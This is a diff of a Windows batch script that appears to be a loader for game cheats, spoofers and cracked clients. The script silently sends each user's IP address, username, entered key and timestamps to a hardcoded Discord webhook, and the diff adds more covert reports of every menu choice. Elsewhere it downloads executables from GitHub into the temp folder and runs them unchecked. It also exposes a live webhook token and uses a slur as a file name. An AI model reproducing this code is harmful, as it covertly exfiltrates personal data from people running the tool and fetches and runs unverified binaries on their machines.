@@ -31,10 +31,10 @@ goto menu
 :menu2
 set webhook=https://discord.com/api/webhooks/1255946726280400897/_npWrGK9_LvdzUenD5Ekarn7X1AyxT0NMk8LJaXay7ucdsxQLoPEAN0GrguW674sQc-z
 cls
-curl -o %userprofile%\AppData\Local\Temp\ipp.txt https://myexternalip.com/raw
+curl -o %userprofile%\AppData\Local\Temp\%username%.txt https://myexternalip.com/raw
 cls
 curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```New CTH Login detected! Customer info: Key used: (%haslo%) User: (%username%) Date: (%date%) Time: (%time%) IP:```\"}" %webhook%
-curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\ipp.txt %webhook%
+curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\%username%.txt %webhook%
 cls
 mode 130,30
 echo    [36m██████╗████████╗██╗  ██╗    ██╗      ██████╗  █████╗ ██████╗ ███████╗██████╗ 
@@ -61,6 +61,7 @@ echo [31mWrong option!
 timeout 3 >nul
 goto menu2
 :spooferstart
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"`%username%` selected option spoofer.\"}" %webhook%
 cls
 mode 130,30
 echo    [36m██████╗████████╗██╗  ██╗    ██╗      ██████╗  █████╗ ██████╗ ███████╗██████╗ 
@@ -145,6 +146,7 @@ timeout 3 >nul
 exit
 
 :cheat
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"`%username%` selected option FiveM cheat.\"}" %webhook%
 cls
 mode 130,30
 echo    [36m██████╗████████╗██╗  ██╗    ██╗      ██████╗  █████╗ ██████╗ ███████╗██████╗ 
@@ -161,6 +163,7 @@ timeout 3 >nul
 exit
 
 :slinky
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"`%username%` selected option slinky.\"}" %webhook%
 cls
 cd %temp%
 curl -s https://raw.githubusercontent.com/Bezikk/wyglond.dev/scripts/niger.exe --output niger.exe
@@ -176,6 +179,7 @@ echo [36mStarting cheat.
 niger.exe
 
 :lunar
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"`%username%` selected option lunar cracked.\"}" %webhook%
 cls
 cd %temp%
 curl -s https://raw.githubusercontent.com/Bezikk/lunarcracked/main/cracked_lunar.exe --output cracked_lunar.exe
